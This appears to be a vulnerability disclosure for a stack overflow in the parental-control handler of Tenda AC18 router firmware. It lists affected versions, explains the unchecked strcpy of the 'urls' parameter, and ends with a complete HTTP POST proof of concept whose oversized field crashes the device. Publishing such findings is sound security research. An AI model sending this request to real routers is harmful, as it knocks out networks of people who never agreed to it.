Tenda AC18 Unauthorized stack overflow vulnerability
===
1.Affected version:
---
V15.03.05.05_multi and V15.03.05.19_multi  

2.Firmware download address
---
https://www.tenda.com.cn/download/detail-2683.html  

3.Vulnerability details
---
![image](https://user-images.githubusercontent.com/104344137/183282684-b4782203-e150-4145-bb4b-bdf4f6271cba.png)
![image](https://user-images.githubusercontent.com/104344137/183282688-9f5d0db4-711e-45ec-9d62-c1ce85815871.png)  
In function saveParentControlInfo, the content obtained by the program from the urls parameter is passed to V24, and then the V24 is directly copied into the V17 + 80 stack through the strcpy function. There is no size check, so there is a stack overflow vulnerability. The attacker can easily perform a Deny of Service Attack or Remote Code Execution with carefully crafted overflow data.  

4.Recurring vulnerabilities and POC
---
In order to reproduce the vulnerability, the following steps can be followed:  
1.Use the fat simulation firmware V15.03.05.19_multi  
2.Attack with the following overflow POC attacks  
'''
POST /goform/saveParentControlInfo HTTP/1.1  
Host: 192.168.0.1  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0  
Accept: */*  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
X-Requested-With: XMLHttpRequest  
Content-Length: 143  
Origin: http://192.168.0.1  
Connection: close  
Referer: http://192.168.0.1/parental_control.html?random=0.524930998878748&  
Cookie: password=0d403f6ad9aea37a98da9255140dbf6ecmucvb

deviceId=02%3A03%3A04%3A05%3A06%3A07&deviceName=&enable=1&time=19%3A0021%3A00&url_enable=1&urls=ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss&day=1%2C1%2C1%2C1%2C1%2C1%2C1&limit_type=0
'''

This PoC can result in a Dos.
